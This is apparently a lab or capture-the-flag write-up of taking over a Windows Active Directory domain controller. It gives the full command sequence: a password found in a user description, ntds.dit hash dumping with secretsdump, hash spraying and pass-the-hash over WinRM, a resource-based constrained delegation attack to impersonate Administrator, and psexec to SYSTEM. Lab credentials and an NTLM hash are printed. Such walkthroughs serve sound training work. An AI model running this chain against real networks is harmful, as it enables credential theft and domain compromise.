#Pwned #AD #Windows #Bloodhound #TGS
```IP
192.168.154.175
```
## Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.154.175 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-10-25 09:43:12Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125 
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 125 
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125                                                                          
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
```
## SMB
As always I see SMB service open, I enumerate it with nxc tool, tinkering with different blank parameters to see if Guest account is available. In this case it seems that no shares are available:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025114625.png?raw=true)

When attempting the same enumeration with enum4linux, which automatically dumps a lot of information, it prompts the description of the users in the machine. For V.Ventz a password is disclosed as shown below:
```
enum4linux -a -u "" -p "" 192.168.154.175 && enum4linux -a -u "guest" -p "" 192.168.154.175
```

```
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                                
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god                                                                                                                         
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert                                                                                                                                     
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain                                                                                                      
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist                                                                                                                                 
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer                                                                                                                                            
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account                                                                                                                       
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin                                                                                                                                              
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin                                                                                                                                           
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer                                                                                                                                     
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin                                                                                                                                        
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist                                               index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!                                                                                                              
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458] 
```


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025120730.png?raw=true)

With the new credentials we gain access to SMB service. Upon examination, we see a `Password Audit` share that contains some sensitive files such as SYSTEM and ntds.dit.
```
smbclient -U 'V.Ventz' --password='HotelCalifornia194!' \\\\192.168.154.175\\'Password Audit'
```
With impacket secretsdump tool we can extract the NTLM hashes that these files contain:
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
We can try to decrypt them with hashcat but it will not work:
```
hashcat -m 1000 -w 3 -a 0 -p : --session=all — username -o ./cracked.out --outfile-format=3 ./secrets.dump.ntds /usr/share/wordlists/rockyou.txt --potfile-path ./hashcat.pot
```
## WINRM

With nxc we can spray the obtained hashes with the previous obtained users to see if any of them matches:
```
nxc winrm 192.168.154.175 -u users.txt -H hashes.txt
```
It seems like we have a hit for L.Livingstone. The next step is using the evil-winrm functionality to pass the hash for this user and gain remote access:
```
evil-winrm -i 192.168.154.175 -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'
```
It let us in!

# PrivEsc

## Manual
Once we have remote access we should inmediately check the permissions and groups of our current user with `whoami /all` as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025132137.png?raw=true)

Unfornunately, nothing interesting shows up.
## Automated

### Bloodhound

After some unsuccessful manual enumeration, we can execute bloodhound to see if we have missed something. It seems like our current user has a GenericAll permission over the Domain.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025154635.png?raw=true)

Therefore, we can create a computer named ATTACK belonging to this domain as shown below:

```
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.154.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'Password123!'
```

Next, we will modify the delegation rights of ATTACK to impersonate other users:
```
python3 rbcd.py -action write -delegate-to "RESOURCEDC$" -delegate-from "ATTACK$" -dc-ip 192.168.154.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
```

And now we could request a TGS ticket for this newly added computer and Administrator user:
```
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'Password123!' -impersonate Administrator -dc-ip 192.168.154.175
```

Export the obtained ticket with the following command:
```
export KRB5CCNAME=$PWD/Administrator.ccache
```
Those steps are shown in the image below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025165358.png?raw=true)

Now we need to assess that we have added correctly the domain to our /etc/hosts file and only then it is possible to connect with psexec with the following command:
```
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.154.175
```

And we are NT Authority\System as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241025183317.png?raw=true)

Pwned!